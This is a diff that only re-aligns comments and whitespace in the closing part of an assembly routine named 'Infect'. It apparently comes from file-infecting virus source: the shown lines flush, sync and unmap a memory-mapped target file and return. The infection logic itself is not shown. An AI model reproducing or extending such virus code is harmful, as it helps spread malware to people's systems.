@@ -286,7 +286,7 @@ Infect: ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;
   sub   rsp,  0x8
   push  rdi
 
-  MSync rdx,  [rsp + VX_CTX.qFileSize - 0x10], MS_SYNC     ; msync(addr, len, MS_SYNC)
+  MSync rdx,  [rsp + VX_CTX.qFileSize - 0x10], MS_SYNC  ; msync(addr, len, MS_SYNC)
 
   pop   rdi
   add   rsp,  0x8
@@ -295,20 +295,20 @@ Infect: ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;
   js    .InfectCleanUp
 
   ; fsync(fd) - just to make sure
-  FSync rdi                                               ; fsync(fd)
+  FSync   rdi                                           ; fsync(fd)
 
-  MUnMap  [rsp], [rsp + VX_CTX.qFileSize]                 ; free mapped file
+  MUnMap  [rsp], [rsp + VX_CTX.qFileSize]               ; free mapped file
 
-  xor     rax,  rax                                       ; return 0
+  xor     rax,  rax                                     ; return 0
   mov     rsp,  rbp
   pop     rbp
   ret
 
   .InfectCleanUp:
-  MUnMap  [rsp], [rsp + VX_CTX.qFileSize]                 ; free mapped file
+  MUnMap  [rsp], [rsp + VX_CTX.qFileSize]               ; free mapped file
 
   .InfectFailureExit:
-  xor     rax,  rax                                       ; return 1
+  xor     rax,  rax                                     ; return 1
   inc     rax
   mov     rsp,  rbp
   pop     rbp
